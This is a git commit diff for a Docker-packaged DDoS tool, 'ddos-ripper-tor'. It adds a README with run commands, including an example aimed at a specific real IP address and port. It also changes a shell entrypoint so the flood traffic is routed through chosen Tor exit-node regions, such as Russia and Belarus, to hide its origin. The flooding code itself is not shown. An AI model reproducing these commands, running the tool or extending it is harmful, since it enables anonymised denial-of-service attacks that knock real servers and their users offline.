689a910273771bfd0a23eef313e83599d9bf936d
Hlib Hraif <hlib.hraif@protonmail.com>
2022-03-03 03:09:59 +0100

    Make Tor exit nodes regions a separate parameter

---
+++ README.md
@@ -0,0 +1,23 @@
+# Requirements
+
+## Install Docker
+
+- [Windows](https://docs.docker.com/desktop/windows/install)
+- [Linux](https://docs.docker.com/engine/install/ubuntu/)
+- [Mac](https://docs.docker.com/desktop/mac/install)
+
+# Usage
+
+```docker run --rm -it zengraf/ddos-ripper-tor -s [IP address]```
+
+## Parameters
+
+- `-r <refresh>` - Tor IP refresh in seconds
+- `-e <regions>` - Tor exit node regions separated by comma
+- `-s <server>` - server IP address
+- `-p <port>` - server port
+- `-t <turbo>` - turbo
+
+## Example
+
+```docker run --rm -it zengraf/ddos-ripper-tor -e ru,by -s 194.54.14.139 -p 443```
--- docker_entrypoint.sh
+++ docker_entrypoint.sh
@@ -6,6 +6,7 @@ usage() {
 Usage: $PROGNAME [-r <refresh>] [-s <server>] [-p <port>] [-t <turbo>]
 
     -r <refresh>  tor IP refresh (seconds)  [60]
+    -e <regions>  exit node regions         []
     -s  <server>  server ip or domain
     -p    <port>  server port               [80]
     -t   <turbo>  turbo                     [135]
@@ -14,15 +15,23 @@ EOF
 }
 
 refresh=60 port=80 turbo=135
-while getopts r:s:p:t o; do
+while getopts r:e:s:p:t o; do
   case $o in
     (r) refresh=$OPTARG;;
+    (e) exit_nodes=(${OPTARG//,/ });;
     (s) server=$OPTARG;;
     (p) port=$OPTARG;;
     (t) turbo=$OPTARG;;
     (*) usage
   esac
 done
+
+if [ ${#exit_nodes[@]} -ne 0 ]; then
+  echo "StrictNodes 1" >> /etc/tor/torrc
+
+  printf -v formatted_exit_nodes '{%s},' "${exit_nodes[@]}"
+  echo "ExitNodes ${formatted_exit_nodes%,}" >> /etc/tor/torrc
+fi
 
 echo "MaxCircuitDirtiness $refresh" >> /etc/tor/torrc
 
